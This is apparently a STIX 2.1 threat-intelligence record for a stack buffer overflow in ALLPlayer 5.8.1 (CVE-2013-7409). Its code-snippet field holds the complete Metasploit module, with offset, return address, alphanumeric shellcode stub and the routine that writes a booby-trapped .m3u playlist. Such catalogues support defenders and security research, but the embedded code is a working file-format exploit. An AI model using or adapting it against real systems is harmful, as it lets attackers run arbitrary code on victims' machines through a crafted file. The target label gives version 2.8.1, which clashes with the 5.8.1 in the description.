{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ab1ebb5-4aca-4189-8730-2436b100d6fe",
    "created": "2024-08-14T16:37:49.195096Z",
    "modified": "2024-08-14T16:37:49.1951Z",
    "name": "ALLPlayer M3U Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in ALLPlayer 5.8.1, caused by a long string in a playlist entry. By persuading the victim to open a specially-crafted .M3U file, a remote attacker could execute arbitrary code on the system or cause the application to crash. This module has been tested successfully on Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/allplayer_m3u_bof.rb",
            "external_id": "allplayer_m3u_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-7409"
        },
        {
            "source_name": "reference",
            "url": "http://www.allplayer.org/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ALLPlayer M3U Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability in\n        ALLPlayer 5.8.1, caused by a long string in a playlist entry.\n        By persuading the victim to open a specially-crafted .M3U file, a\n        remote attacker could execute arbitrary code on the system or cause\n        the application to crash. This module has been tested successfully on\n        Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'metacom',      # Vulnerability discovery\n          'Mike Czumak',  # Original exploit\n          'Gabor Seljan'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-7409' ],\n          [ 'BID', '62926' ],\n          [ 'BID', '63896' ],\n          [ 'EDB', '28855' ],\n          [ 'EDB', '29549' ],\n          [ 'EDB', '29798' ],\n          [ 'EDB', '32041' ],\n          [ 'OSVDB', '98283' ],\n          [ 'URL', 'http://www.allplayer.org/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'DisableNops'    => true,\n          'BadChars'       => \"\\x00\\x0a\\x0d\\x80\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\",\n          'Space'          => 3060,\n          'EncoderType'    => Msf::Encoder::Type::AlphanumUnicodeMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'EAX'\n            }\n        },\n      'Targets'        =>\n        [\n          [ ' ALLPlayer 2.8.1 / Windows 7 SP1',\n            {\n              'Offset' => 301,\n              'Ret'    => \"\\x50\\x45\",  # POP POP RET from ALLPlayer.exe\n              'Nop'    => \"\\x6e\"       # ADD BYTE PTR DS:[ESI],CH\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-10-09',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u'])\n        ],\n      self.class)\n\n  end\n\n\n  def exploit\n    nop = target['Nop']\n\n    sploit =  rand_text_alpha_upper(target['Offset'])\n    sploit << \"\\x61\\x50\"      # POPAD\n    sploit << target.ret\n    sploit << \"\\x53\"          # PUSH EBX\n    sploit << nop\n    sploit << \"\\x58\"          # POP EAX\n    sploit << nop\n    sploit << \"\\x05\\x14\\x11\"  # ADD EAX,0x11001400\n    sploit << nop\n    sploit << \"\\x2d\\x13\\x11\"  # SUB EAX,0x11001300\n    sploit << nop\n    sploit << \"\\x50\"          # PUSH EAX\n    sploit << nop\n    sploit << \"\\xc3\"          # RET\n    sploit << nop * 109\n    sploit << payload.encoded\n    sploit << rand_text_alpha_upper(10000) # Generate exception\n\n    # Create the file\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(\"http://\" + sploit)\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-10-09",
    "x_mitre_platforms": [
        "win'"
    ]
}